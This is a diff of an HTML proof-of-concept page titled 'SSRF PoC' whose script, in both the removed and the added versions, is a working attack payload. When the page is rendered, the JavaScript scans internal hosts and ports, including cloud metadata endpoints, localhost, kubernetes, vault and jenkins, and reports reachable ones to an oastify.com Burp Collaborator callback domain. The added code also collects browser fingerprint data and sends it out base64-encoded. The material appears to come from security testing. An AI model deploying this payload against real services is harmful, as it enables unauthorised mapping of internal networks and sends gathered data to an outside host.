@@ -1,41 +1,60 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>SSRF PoC</title>
 </head>
+
 <body>
-    This website is for testing
-  <img src="https://200s3lloljyxxbpylp4tg4r3zu5ltch1.oastify.com?ItsRenderingHtml" onerror="fetch('200s3lloljyxxbpylp4tg4r3zu5ltch1.oastify.com/?JavascriptIsExecuted')"/>
-<script>
-    const burp_collaborator = "https://200s3lloljyxxbpylp4tg4r3zu5ltch1.oastify.com.oastify.com";
+    <h1>Hello</h1>
+    <img src="https://nh8spbebzh66tzfvnf2p0mkyzp5gt7hw.oastify.com/?ItsRenderingHtml">
+    <script>
+        const hosts = [
+            "127.0.0.1",
+            "host.docker.internal",
+            "internal",
+            "gateway",
+            "metadata.google.internal",
+            "metadata.aws.internal",
+            "kubernetes.default",
+            "vault.internal",
+            "jenkins.internal",
+            "grafana",
+            "prometheus",
+            "gitlab",
+            "nexus",
+            "dev",
+            "staging",
+            "prod",
+            "db",
+            "admin"
+        ];
 
-// Notify Burp that JavaScript was executed
-fetch(`${burp_collaborator}?JavascriptIsExecuted=True`);
+        const ports =   [80, 443, 8080, 3000, 5000, 8000,7,8443, 9, 13, 21, 22, 23, 25, 26, 37, 53, 69, 70, 79, 88, 106, 110,
+111, 113, 119, 135, 139, 143, 161, 179, 199, 389, 427, 443, 465];
 
-// Internal IPs and Ports
-const ips = ["169.254.169.254", "169.254.170.2", "168.63.129.16"];
-const ports = [
-  22, 80, 443, 2375, 2376, 8080, 8000, 8888, 27017, 3306, 5432, 6379, 5000,
-  9090, 9200, 9300, 15672, 3000, 50070, 2049, 389, 5984, 10250, 10255, 8181,
-  16992, 6006
-];
+        hosts.forEach(host => {
+            ports.forEach(port => {
+                fetch(`http://${host}:${port}`, { mode: "no-cors" })
+                    .then(() => {
+                        fetch(`https://nh8spbebzh66tzfvnf2p0mkyzp5gt7hw.oastify.com/?open=${host}:${port}`);
+                    })
+                    .catch(() => { });
+            });
+        });
+    // Browser environment extraction
+    const info = {
+      ua: navigator.userAgent,
+      platform: navigator.platform,
+      webdriver: navigator.webdriver,
+      plugins: navigator.plugins.length,
+      languages: navigator.languages
+    };
+        fetch("https://nh8spbebzh66tzfvnf2p0mkyzp5gt7hw.oastify.com/?fingerprint=" + btoa(JSON.stringify(info)));
+    </script>
 
-// Scan local ports (e.g., for SSRF or service exposure)
-ports.forEach(port => {
-  fetch(`http://localhost:${port}`, { mode: "no-cors" })
-    .then(() => fetch(`${burp_collaborator}/?openPort=${port}`))
-    .catch(() => { });
-});
-
-// Scan internal IPs
-ips.forEach(ip => {
-  fetch(`http://${ip}`, { mode: "no-cors" })
-    .then(() => fetch(`${burp_collaborator}/?liveIP=${ip}`))
-    .catch(() => { });
-});
-
-</script>
 </body>
+
 </html>
